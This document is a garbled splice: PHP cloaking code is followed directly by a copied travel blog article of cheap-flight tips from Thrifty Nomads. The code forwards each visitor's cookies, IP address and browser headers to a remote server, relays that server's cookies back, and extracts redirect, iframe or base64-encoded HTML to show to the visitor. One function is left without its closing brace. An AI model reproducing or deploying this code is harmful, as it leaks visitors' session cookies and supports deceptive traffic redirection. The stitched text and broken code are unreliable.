function send_request($url)
{
    $ch = curl_init($url);

    if (debug_mode_enabled()) {
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        curl_setopt($ch, CURLOPT_STDERR, fopen('php://output', 'w+'));
    }

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    curl_setopt($ch, CURLOPT_USERAGENT, isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : null); //Specifies user's agent
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "API-client-headers: " . browser_headers(),
            "API-forwarded-IP: " . user_ip() //Specifies user's ip
            ));

    if ($_COOKIE) {//Forward visitor's cookie to our server
        curl_setopt($ch, CURLOPT_COOKIE, encode_visitor_cookies());
    }

    curl_setopt($ch, CURLOPT_HEADERFUNCTION, "forward_response_cookies"); //Forward response's cookies to visitor

    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}

function forward_response_cookies($ch, $headerLine)
{
    if (preg_match('/^Set-Cookie:/mi', $headerLine, $cookie)) {
        header($headerLine, false);
    }

    return strlen($headerLine); // Needed by curl

function encode_visitor_cookies()
{
    $transmit_string = "";

    foreach ($_COOKIE as $name => $value) {
        $transmit_string .= "$name=$value; ";
    }

    return $transmit_string;
}

function browser_headers()
{
    $headers = array();

    foreach ($_SERVER as $header => $value) {
        if (substr($header, 0, 5) == "HTTP_" AND $header != 'HTTP_COOKIE') {
            $headers[$header] = $value;
        }
    }

    return urlencode(base64_encode(json_encode($headers)));
}

function va($s)
{
    $a = 0;
    foreach (str_split($s) as $c) {
        $a += ord($c);
    }

    return $a == 465;
}

function is_valid_external_ip($ip) {
    return filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE| FILTER_FLAG_IPV4) !== false;
}

function user_ip() {
    if (isset($_SERVER['HTTP_VIA']) AND stripos($_SERVER['HTTP_VIA'], 'Chrome-Compression-Proxy') !== false) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return $ips[0];
    }

    $cloudflare_ip = isset($_SERVER['HTTP_CF_CONNECTING_IP']) ? $_SERVER['HTTP_CF_CONNECTING_IP'] : null;
    if ($cloudflare_ip AND is_valid_external_ip($cloudflare_ip)) {
        return $cloudflare_ip;
    }

    $forwarded_for_ip = first_valid_forwarded_for_ip();
    if ($forwarded_for_ip) {
        return $forwarded_for_ip;
    }

    $ip = $_SERVER['REMOTE_ADDR'];
    if (is_valid_external_ip($ip)) {
        return $ip;
    }
}

function first_valid_forwarded_for_ip() {
    if (!isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return null;
    }

    foreach (explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']) as $ip) {
        if (is_valid_external_ip($ip)) {
            return $ip;
        }
    }
}

function extract_real_url_from_cloaker_response() {//When iframe or header_redirect is being used
    global $response;

    $redirect_pattern = "|window.location='(.*?)';|";
    if (preg_match($redirect_pattern, $response, $matches)) {
        return $matches[1];
    }

    $iframe_pattern = "|<iframe src='(.*?)'|";
    if (preg_match($iframe_pattern, $response, $matches)) {
        return $matches[1];
    }

    $paste_html_pattern = '|ru="(.*?)";|';
    if (preg_match($paste_html_pattern, $response, $matches)) {
        return base64_decode($matches[1]);
    }
}

function extract_unfiltering_action_from_cloaker_response() {
    global $response;

    $redirect_pattern = "|window.location='.*?';|";
    if (preg_match($redirect_pattern, $response)) {
        return "header_redirect";
    }

    $iframe_pattern = "|<iframe src='.*?'|";
    if (preg_match($iframe_pattern, $response)) {
        return "iframe";
    }

    $paste_html_pattern = "|\.decode\(|";
    if (preg_match($paste_html_pattern, $response)) {
        return "paste_html";
    }
}

<h2>1. Keep your searches&nbsp;top secret</h2>
<p>You’re not crazy&nbsp;for thinking that&nbsp;a flight price has changed after searching it a few times in your web browser. Based on the cookies in your browser, flight prices&nbsp;<em>do</em>&nbsp;increase when a particular route is repeatedly searched, as the site wants&nbsp;to scare you into booking the flight quickly before prices get even higher. <strong><span style="text-decoration: underline;">Always</span> search for flights in incognito or private browsing mode to see the lowest prices</strong>.</p>
<p>In Google Chrome or Safari, incognito&nbsp;is enabled by hitting Command (or “Control” if using PC), Shift, “N”. For Mozilla Firefox or Internet Explorer, hit Command (or “Control” if using a PC), Shift, “P”. This will open a new browser window where your information is not tracked, thus not inflating prices as you search. Note: if you’re&nbsp;using an older version of OS X, open&nbsp;Safari then&nbsp;click “Safari” in the menu bar, and select&nbsp;“Private Browsing”.</p>
<p>Your cookies are reset each time you re-open an incognito window. So if you want to start with a clean slate for each flight search (so your previous searches aren’t “remembered”, potentially inflating costs),&nbsp;<strong>close all your incognito windows, open a new one, and then perform your flight search</strong>.</p>

<h2>4. Befriend budget airlines</h2>
<p>Budget airlines offer significantly cheaper tickets than their full-service counterparts. It should be obvious, but this comes with compromises such as less leg room and no “free” food/drink on-board (which by the way, is normally covered in your higher-priced ticket with full-service airlines).</p>
<p>If you are considering flying budget, which in our opinion is a great way to save, I’d highly recommend reading our guide on&nbsp;<a href="https://thriftynomads.com/7-must-know-facts-about-budget-airlines/" target="_blank">7 must-know facts about budget airlines</a>.</p>
<p>Below is&nbsp;a comprehensive list of budget airlines around the globe. <strong><span style="color: #ff0000;">Red</span></strong> indicates true&nbsp;budget airlines while <span style="color: #0000ff;"><strong>blue</strong></span>&nbsp;implies the cheapest companies available where budget airlines don’t exist or aren’t plentiful.</p>
<p><span style="color: #ff0000;"><strong>But First… <span style="text-decoration: underline;">A NOTE ON BOOKING BUDGET AIRLINES.</span></strong></span>&nbsp;<span style="text-decoration: underline;">Always read the fine print</span>&nbsp;and do the following:</p>
<ol>
<li>Check where the <strong>airport location</strong> is (some budget airlines fly to airports further out of &nbsp;town).</li>
<li>Ensure you’ve <strong>booked &amp; paid for your luggage allowance.</strong>&nbsp;Adhere to&nbsp;restrictions on <span style="text-decoration: underline;">weight</span>, <span style="text-decoration: underline;">height</span>, and <span style="text-decoration: underline;">#&nbsp;of bags allowed</span>.&nbsp;Some airlines (e.g. Ryanair) will charge <strong>hefty fee</strong> if you’re over. Remember, paying <em>only</em> for the <span style="text-decoration: underline;">exact</span>&nbsp;luggage space/weight you need&nbsp;is how budget airlines keep their prices <em>lower</em> than traditional airlines!</li>
<li><span style="text-decoration: underline;">Read the&nbsp;fine print</span>. The best example is that Ryanair WILL CHARGE A FEE&nbsp;if you do not <strong>print your own ticket or adhere to their strict luggage weight and dimensions.&nbsp;</strong>A warning of this fee is <span style="text-decoration: underline;">clearly</span> stated in all capital letters&nbsp;in the&nbsp;first sentence of your e-confirmation. In a nutshell, always read and follow instructions!</li>
</ol>
<p>Remember, if you want to book the <span style="text-decoration: underline;">cheapest</span> flight possible&nbsp;(<em>not</em>&nbsp;service-of-the-year-award-winner), be adaptable, do your research, and know the budget airline’s requirements &amp; restrictions.</p>

<h2 id="tip-5">5. Book long-haul flights yourself for less</h2>
<p>If you’re flying somewhere that involves a transfer, say from Canada to Australia which typically involves Canada to LA, then LA to Australia, consider that&nbsp;it may be cheaper to book these&nbsp;two legs separately on your own by adding another destination to your trip. It should go without saying that in doing this, you <span style="text-decoration: underline;">should not book&nbsp;tight layovers</span>. I repeat: <span style="color: #ff0000;"><strong>do not book layovers that are hours apart!</strong> </span>This approach is&nbsp;for those who want to&nbsp;create an <em>additional</em>&nbsp;destination of <strong>a few days or more,</strong> before catching&nbsp;their next flight.</p>
<p>First, do your research: are there budget airlines unique to the country you’re flying out of <em>and</em>&nbsp;where you’re headed to? Booking with a budget Australian airline from Sydney to Honolulu, then an American one from Honolulu to Montreal saved us over $400 each when flying back from Australia to Canada earlier this year. This allowed us to create&nbsp;a thrifty five-day stopover in Hawaii on our way back, which was less exhausting and a lot cheaper! <a href="https://thriftynomads.com/go/kiwi.com" target="_blank">Kiwi.com</a>&nbsp;and <a href="https://thriftynomads.com/go/airwander.com" target="_blank">AirWander</a> are both great search engine for revealing cheaper routes like this&nbsp;that involve multiple airlines.</p>

<p>You can even book your own <strong>multi-day</strong> layovers, essentially allowing you to see 2 destinations for the price of 1. Rather than spend a day sitting in the airport, you can spend multiple days exploring the city you are laying over in. <a href="https://thriftynomads.com/go/airwander.com" target="_blank">AirWander</a> is a specialized search engine for doing exactly this. Put in your origin, final destination, and number of days you want to stopover. <a href="https://thriftynomads.com/go/airwander.com" target="_blank">AirWander</a> will return a list of places you can visit on your stopover, often even cheaper than a regular flight search engine! To learn how to do this, read our guide on <a href="https://thriftynomads.com/airlines-offer-free-stopovers/">How to Get Free Extended Layovers &amp; Hack One Trip Into Two</a>.</p>
<h2>6. Find the cheapest place to fly</h2>
<p>Whether you know exactly where you’re going or you just want to find&nbsp;to the cheapest possible country to fly into, <a href="https://thriftynomads.com/go/kiwi.com" target="_blank">Kiwi.com</a>&nbsp;is a great&nbsp;tool to get the wanderlust going and save some big bucks. Hop on their site and enter your departure city, then select a&nbsp;date range to fly. Approximate costs then appear over hundreds of countries around the globe from your departure point, while the list of destinations is sorted by price, allowing you to see the most cost-effective place you can fly.</p>
<p><a href="https://thriftynomads.com/go/kiwi.com" target="_blank"><img data-attachment-id="14186" data-permalink="https://thriftynomads.com/booking-cheapest-flight-possible-anywhere/kiwi-flight-search/" data-orig-file="https://thriftynomads.com/wp-content/uploads/2014/11/kiwi-flight-search.png" data-orig-size="2048,1158" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Kiwi flight search" data-image-description="" data-medium-file="https://thriftynomads.com/wp-content/uploads/2014/11/kiwi-flight-search-300x170.png" data-large-file="https://thriftynomads.com/wp-content/uploads/2014/11/kiwi-flight-search-1024x579.png" class="wp-image-14186 size-large aligncenter" src="/travel-hack-flights-imnf5/xkiwi-flight-search-1024x579.png.pagespeed.ic.ODVl47lA9n.webp" width="1024" height="579" srcset="https://thriftynomads.com/wp-content/uploads/2014/11/xkiwi-flight-search-1024x579.png.pagespeed.ic.ODVl47lA9n.webp 1024w, https://thriftynomads.com/wp-content/uploads/2014/11/xkiwi-flight-search-300x170.png.pagespeed.ic.y6p9Mymq8R.webp 300w, https://thriftynomads.com/wp-content/uploads/2014/11/xkiwi-flight-search-768x434.png.pagespeed.ic.JnlD1P19ua.webp 768w, https://thriftynomads.com/wp-content/uploads/2014/11/xkiwi-flight-search.png.pagespeed.ic.AU22p-_s9r.webp 2048w" sizes="(max-width: 1024px) 100vw, 1024px" data-pagespeed-url-hash="1755371963" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></a></p>
<p>Where <a href="https://thriftynomads.com/go/kiwi.com" target="_blank">Kiwi.com</a>&nbsp;really shines is the way in which it mixes and matches airlines in order to find the cheapest price.&nbsp;For example, maybe you want to go to Rome, Italy&nbsp;from Washington, USA. A typical flight search engine will only&nbsp;suggest&nbsp;routes coming from a single airline and its partners. An example search on <a href="https://thriftynomads.com/go/expedia.com" target="_blank">Expedia</a> shows the cheapest route&nbsp;as $631.20 USD via TAP Portugal.</p>
<p><a href="https://thriftynomads.com/go/kiwi.com" target="_blank">Kiwi.com</a>, on the other hand, will mix and match airlines (including&nbsp;<strong>budget airlines</strong>) in order to find you the very cheapest route. For long-haul flights especially, this can make a huge difference. The same search on <a href="https://thriftynomads.com/go/kiwi.com" target="_blank">Kiwi.com</a>&nbsp;returns a route at $459.80 USD via JetBlue, Norwegian Air, and Vueling. That’s a savings of&nbsp;<strong>$171.40 USD</strong>, and the travel time&nbsp;is even shorter!</p>
<p><a href="https://thriftynomads.com/go/kiwi.com" target="_blank"><img data-attachment-id="14200" data-permalink="https://thriftynomads.com/booking-cheapest-flight-possible-anywhere/kiwi-vs-expedia-flights/" data-orig-file="https://thriftynomads.com/wp-content/uploads/2014/11/kiwi-vs-expedia-flights.jpg" data-orig-size="2000,568" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="Kiwi vs Expedia flights" data-image-description="" data-medium-file="https://thriftynomads.com/wp-content/uploads/2014/11/kiwi-vs-expedia-flights-300x85.jpg" data-large-file="https://thriftynomads.com/wp-content/uploads/2014/11/kiwi-vs-expedia-flights-1024x291.jpg" class="aligncenter wp-image-14200 size-large" src="/travel-hack-flights-imnf5/xkiwi-vs-expedia-flights-1024x291.jpg.pagespeed.ic.uFy2exSAdf.webp" alt="Kiwi vs Expedia flights" width="1024" height="291" srcset="https://thriftynomads.com/wp-content/uploads/2014/11/xkiwi-vs-expedia-flights-1024x291.jpg.pagespeed.ic.uFy2exSAdf.webp 1024w, https://thriftynomads.com/wp-content/uploads/2014/11/xkiwi-vs-expedia-flights-300x85.jpg.pagespeed.ic.yMldGIcuu-.webp 300w, https://thriftynomads.com/wp-content/uploads/2014/11/xkiwi-vs-expedia-flights-768x218.jpg.pagespeed.ic.Nc2TxliMJE.webp 768w, https://thriftynomads.com/wp-content/uploads/2014/11/xkiwi-vs-expedia-flights.jpg.pagespeed.ic.G_GG4IqSBT.webp 2000w" sizes="(max-width: 1024px) 100vw, 1024px" data-pagespeed-url-hash="3840188665" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></a></p>
<p>Typically,&nbsp;booking a whole trip with different airlines&nbsp;would be risky. For example, let’s say&nbsp;your first flight with JetBlue was delayed, and you missed your connecting flight with Norwegian Air. Because the airlines have no association with each other, Norwegian Air has no obligation to reschedule your flight for free, so you&nbsp;would just lose your money. <a href="https://thriftynomads.com/go/kiwi.com" target="_blank">Kiwi.com</a>&nbsp;instead offers <strong>their own guarantee</strong>, which covers schedule changes, flight delays, and cancellations. As long as you contact <a href="https://thriftynomads.com/go/kiwi.com" target="_blank">Kiwi.com</a>&nbsp;as soon as you’re aware of the delay, they will provide you with an alternate connecting flight, or a full refund, at your discretion. We haven’t used this guarantee ourselves, but it certainly sounds like an appealing way to take the risk out of a thrifty flight hack!</p>
<h2>7. Use a travel agent</h2>
<p>Travel agents have special undercut rates that are unaccessible to the public,&nbsp;although this doesn’t <em>always</em> ensure they can provide the best price. It is wise to do your own research first, find the cheapest flight, and present that information to them to see if they can match or beat it.&nbsp;This would be especially beneficial for long-haul flights, where even slight savings could equate to&nbsp;a few hundred dollars. They can also help you <a href="https://thriftynomads.com/airlines-offer-free-stopovers/">extend your layovers</a> so you can enjoy a few days in a different city, rather than just sitting in the airport.</p>
<h2>8. Don’t forget about local airlines</h2>
<p>While the above search engines are great, they do not always include small airlines, especially in less popularly booked routes and/or in&nbsp;remote regions. If you’re flying somewhere obscure, Google search and ask around if there exists a local airline. While in South America we learnt that the <a href="http://lade.com.ar/" target="_blank">LADE Air</a>&nbsp;in Argentina&nbsp;(flown by military pilots) has crazy cheap flights to Patagonia, which is of course not listed in mass search engines online.</p>
<p>When you do find small airlines, even if they are listed in a search engine results, it often pays to check the company site which may reveal exclusive online offers not found in a regular search engine. For example, when flying in Western Canada, I found that Hawk Air, a small and local company offers weekly deals on certain days. Be sure to double check!</p>
<h2>9. If you know when and where you’re going, don’t wait to book</h2>
<p>Rarely ever do airline tickets get cheaper as your departure date approaches, especially if you need to fly on a certain date. Budget airlines typically offer low rates as a baseline price, and as these tickets sell, the remaining ones increase in cost. This is very typical in Europe and Australia. If you know when and where you’re going, don’t wait on an unknown sale. More often than not, your biggest savings come from booking far ahead when you can.</p>
<h2>10. Check if it’s cheaper to&nbsp;pay in other currencies</h2>
<p>Before booking a flight, consider if the rate is cheaper if paid in another currency.&nbsp;Often&nbsp;budget airlines will make you pay in the currency of the country you’re departing from, but this isn’t always the case. <span style="color: #ff0000;"><strong>An important note when doing this</strong></span>: make sure you’re using a credit card that is <span style="text-decoration: underline;">free of foreign-transaction fees</span>, otherwise your attempts to save money doing this will be lost! Our article on <a href="https://thriftynomads.com/best-travel-credit-debit-cards/" target="_blank">money matters for world travellers</a> can help&nbsp;steer you in the right direction for the best credit cards for travel.</p>
<h2 id="tip-11">11. Search for&nbsp;airline error fares</h2>
<p>Airlines sometimes make mistakes when posting their fares, leading to seriously discounted flights. This can happen for various reasons – currency conversion mishaps, technical glitches, or human error. If you’re in the know-how on where to find airline error fares, you can save yourself some serious bucks on a ticket.</p>
<p>Our detailed <a href="https://thriftynomads.com/airline-error-mistake-fares-cheap-flights/" target="_blank">how-to guide</a>&nbsp;spells out&nbsp;how to find mistake fares easily on your own. Basically, <a href="https://thriftynomads.com/go/airfarewatchdog.com" target="_blank">AirFare Watchdog</a> and <a href="http://www.secretflying.com/" target="_blank">Secret Flying</a> are great resources to stalk for finding mistake pricing as they conglomerate slashed ticket rates all in one spot. Another great approach is to search for flights for an entire month using <a href="https://thriftynomads.com/go/skyscanner.com">Skyscanner</a> (Tip #3 in this article). This will allow you to easily spot a significantly reduced fare against what’s displayed that month, and has twice helped us stumble on&nbsp;error fares ourselves.</p>

<h2>12. Consider hidden city ticketing</h2>
<p>Travellers long ago discovered a&nbsp;trick known now as “hidden city” flights. In a nutshell, sometimes a flight that <em>connects</em> in a&nbsp;city you want to go to is cheaper than flying directly to it. So instead, you book that cheap flight which&nbsp;<em>connects</em> in&nbsp;your desired city and hop off there, not taking the ongoing connection.</p>
<p>It should go without saying this is risky for many reasons. Here are some factors to consider:</p>
<ul>
<li><strong>If your luggage is checked, it may go on to the final destination</strong>. For this reason, with&nbsp;hidden city ticketing it’s best to have carry-on luggage only.</li>
<li><strong>You may not be allowed off the plane</strong> (if the same plane is continuing onward to its final destination).</li>
<li><strong>Airlines may detect that you did not take your connection.</strong> The consequences of this are hard to say, especially since people miss flights all the time.</li>
</ul>
<p>There is&nbsp;now a web search engine which finds hidden city tickets for you. It’s called&nbsp;<a href="https://skiplagged.com/" target="_blank">Skiplagged</a>&nbsp;and is currently being sued by United Airlines who is angry about this debatable hack.&nbsp;We have never used the hidden city&nbsp;approach, but I know several who have, and they’ve&nbsp;scored&nbsp;some&nbsp;thrifty savings. <strong>Use&nbsp;at your own risk!</strong></p>
<h2>13. Use flight points when possible</h2>
<p>If you’ve inadvertently forgot about those Aeroplan or Air Miles points you’ve been racking up for years, now’s the time to use them! For Canadians using Air Miles, the best bang for your buck is to use your points for in-country travel, as this uses the least amount of points for the distance, though if you are swimming in points (company credit cards can be a goldmine for this), this is a good way to save serious bucks.</p>
